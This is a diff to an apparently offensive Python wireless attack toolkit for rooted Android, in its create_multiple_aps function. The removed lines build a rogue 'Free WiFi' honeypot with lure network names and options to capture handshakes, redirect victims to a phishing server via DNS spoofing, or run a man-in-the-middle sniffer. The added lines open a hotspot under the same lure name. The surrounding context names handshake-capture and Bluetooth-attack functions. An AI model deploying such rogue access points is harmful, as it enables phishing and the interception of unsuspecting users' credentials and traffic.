@@ -296,54 +296,27 @@ def capture_handshakes(interface):
 
 def create_multiple_aps(interface):
     try:
-        print(f"{Fore.GREEN}[+] Starting WiFi Honeypot...{Fore.RESET}")
+        print(f"{Fore.GREEN}[+] Starting AP using Android system...{Fore.RESET}")
         
-        # Common network names to appear legitimate
-        ssid_list = ["Free WiFi", "Guest Network", "Public WiFi", "Coffee Shop", "Airport_Free"]
+        # Enable tethering using Android settings
+        os.system("su -c 'settings put global tether_dun_required 0'")
+        os.system("su -c 'svc wifi enable'")
+        time.sleep(1)
         
-        print(f"\n{Fore.YELLOW}Select action when device connects:")
-        print(f"1. Capture handshake")
-        print(f"2. Redirect to phishing page")
-        print(f"3. MITM attack")
-        print(f"4. Just monitor{Fore.RESET}")
+        # Configure and start hotspot
+        os.system("su -c 'settings put global wifi_hotspot_ssid \"Free WiFi\"'")
+        os.system("su -c 'settings put global wifi_hotspot_password \"12345678\"'")
+        os.system("su -c 'svc wifi enable'")
+        os.system("su -c 'settings put global wifi_hotspot_enabled 1'")
         
-        action = input(f"\n{Fore.CYAN}Choose action: {Fore.RESET}")
-        
-        # Enable monitor mode directly
-        os.system(f"su -c 'ifconfig {interface} down'")
-        os.system(f"su -c 'iwconfig {interface} mode monitor'")
-        os.system(f"su -c 'ifconfig {interface} up'")
-        
-        # Setup internet sharing
-        os.system(f"su -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'")
-        os.system(f"su -c 'iptables -t nat -A POSTROUTING -o {interface} -j MASQUERADE'")
-        
-        # Create APs
-        for ssid in ssid_list:
-            os.system(f"su -c 'hostapd -B /data/data/com.termux/files/home/{ssid}.conf'")
-            print(f"{Fore.GREEN}[+] Created AP: {ssid}{Fore.RESET}")
-            
-        print(f"{Fore.GREEN}[+] Network ready! Monitoring for connections...{Fore.RESET}")
+        print(f"{Fore.GREEN}[+] AP Created! SSID: Free WiFi, Password: 12345678{Fore.RESET}")
         
         while True:
-            if action == "1":
-                os.system(f"su -c 'tcpdump -i {interface} -w capture.pcap'")
-            elif action == "2":
-                fake_ip = input(f"{Fore.CYAN}Enter your phishing server IP: {Fore.RESET}")
-                dns_spoof("192.168.1.2", fake_ip)
-            elif action == "3":
-                mitm_sniffer(interface)
-            else:
-                os.system(f"su -c 'tcpdump -i {interface}'")
+            time.sleep(1)
             
     except KeyboardInterrupt:
         print(f"\n{Fore.YELLOW}[*] Cleaning up...{Fore.RESET}")
-        os.system(f"su -c 'killall hostapd'")
-        os.system(f"su -c 'iptables -F'")
-        os.system(f"su -c 'iptables -t nat -F'")
-        os.system(f"su -c 'ifconfig {interface} down'")
-        os.system(f"su -c 'iwconfig {interface} mode managed'")
-        os.system(f"su -c 'ifconfig {interface} up'")
+        os.system("su -c 'settings put global wifi_hotspot_enabled 0'")
 
 def bluetooth_attacks():
     if not os.path.exists("/system/xbin/su") and not os.path.exists("/system/bin/su"):
